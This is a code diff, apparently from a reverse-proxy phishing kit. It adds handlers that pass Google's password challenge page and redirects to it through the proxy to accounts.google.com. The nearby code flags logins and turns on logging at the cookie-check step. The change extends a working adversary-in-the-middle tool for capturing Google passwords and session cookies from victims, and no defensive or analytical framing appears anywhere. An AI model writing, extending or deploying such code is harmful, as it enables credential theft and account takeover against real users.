@@ -224,6 +224,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             return super.superExecuteProxy('accounts.youtube.com', clientContext)
         }
 
+        // Handle Gmail password challenge form redirection
+        if (this.req.url.startsWith('/v3/signin/challenge/pwd')) {
+            console.log('Password challenge form requested:', this.req.url)
+            return super.superExecuteProxy('accounts.google.com', clientContext)
+        }
+
         if (this.req.url.startsWith('/CheckCookie')) {
             clientContext.setLogAvailable(true)
             clientContext.info.isLogin = true
@@ -268,6 +274,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
             console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)
+
+            // Handle redirects to password challenge form
+            if (redirectToken.url.includes('/v3/signin/challenge/pwd')) {
+                console.log('Redirecting to password challenge form:', redirectToken.url)
+                // Extract the path and query from the redirect URL
+                const urlObj = new URL(redirectToken.url)
+                this.req.url = urlObj.pathname + urlObj.search
+                return super.superExecuteProxy('accounts.google.com', clientContext)
+            }
 
             if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
                 super.sendClientData(clientContext, {})
